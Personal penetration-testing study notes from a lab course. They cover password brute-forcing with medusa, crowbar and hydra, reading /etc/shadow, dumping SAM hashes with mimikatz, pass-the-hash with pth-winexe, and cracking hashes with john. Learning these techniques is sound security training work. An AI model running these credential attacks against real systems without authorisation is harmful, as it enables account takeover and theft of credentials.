---
title: Study Notes - 2021/07/06
date: 2021-07-06 21:40:32
tags: [Penetration Testing, Study Notes]
---


# HTTP htaccess password attack with medusa
decompress the rockyou wordlist:
```
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

```
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```

# password Attack against Remote Desktop Protocal with crowbar
```
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1  
```

-n number of threads  
-b protocal  
-s host  
-u username  
-C wordlist  

rdp does not reliably handle multiple threads, so we use single thread 

# SSH Attack with THC-Hydra  
-l target username  
-P wordlist  
protocal://IP  
```
hydra -l kali -P test_wdlist.txt ssh://127.0.0.1
```



# HTTP post attack with THC-Hydra 
obtain addtional info about http-form-post options
```
hydra http-form-post -U 

<url>:<form parameters>:<condition string>[:<optional>[:<optional>]
```

```
hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```
request verbose output with -vV, and use -f to stop the attack when the first successful result is found.

# Retrieve Password hashes
`hashid <hashvalue>` to identify hash type  

inspect /etc/shadow file 
```
sudo grep root /etc/shadow
```
```
root:$6$18cMHZ.mB57eU82l$lim7jazX00mXUZEB43IOtlHmpFcuTrceOJ1QObdaGr5fwsfsEryh5xcuJEpH7qOyiOmQHcGkn33vhy66GQDAi1:18696:0:99999:7:::
```
the first of which ($6) references the SHA-512 algorithm  
- $1 = MD5 hashing algorithm.
- $2 =Blowfish Algorithm is in use.
- $2a=eksblowfish Algorithm
- $5 =SHA-256 Algorithm
- $6 =SHA-512 Algorithm
18cMHZ.mB57eU82l the salt  

SAM database cannot be copied while the operating system is running because the Windows kernel keeps an exclusive file system lock on the file.

mimikatz modules facilitate password hash extraction from the Local Security Authority Subsystem (LSASS) process memory where they are cached.

```
C:\Tools\password_attacks\mimikatz.exe
> privilege::debug
> token::elevate
> lsadump::sam
```
token::elevate command to elevate the security token from high integrity (administrator) to SYSTEM integrity. If mimikatz is launched from a SYSTEM shell, this step is not required.  

use lsadump::sam to dump the contents of the SAM database

# Passing the hash in windows  
The Pass-the-Hash (PtH) technique (discovered in 1997) allows an attacker to authenticate to a
remote target by using a valid combination of username and NTLM/LM hash rather than a clear
text password. This is possible because NTLM/LM password hashes are not salted and remain
static between sessions. Moreover, if we discover a password hash on one target, we cannot only
use it to authenticate to that target, we can use it to authenticate to another target as well, as long
as that target has an account with the same username and password.

Security Accounts Manager (SAM)  

To do this, we will use pth-winexe from the Passing-The-Hash toolkit (a modified version of winexe), which performs authentication using the SMB protocol

```
pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

Question: what does "aad3b435b51404eeaad3b435b51404ee" do ? why there are two hashes?
aad3b435b51404eeaad3b435b51404ee: Empty LM HASH `<LM hash>:<NTLM hash>`    

NTLM hash algorithn:
```
MD4(UTF-16-LE(password))
```

Behind the scenes, the format of the NTLM hash we provided was changed into a NetNTLM
version 1 or 2 format during the authentication process. We can capture these hashes using
man-in-the-middle or poisoning attacks and either crack them or relay them

https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html  

# Password cracking
recover clear text password from hash  
```
john hash.txt --format=NT
```
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```
```
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```

## use john with linux password  
```
grep victim /etc/passwd > test_pw.txt
sudo grep victim /etc/shadow > test_shadow.txt
unshadow test_pw.txt test_shadow.txt > test_unshadow.txt
john est_unshadow.txt
```

john need the unshadow format as input hash  

I created a victim user, but the hash type is $y$ which can not be cracked 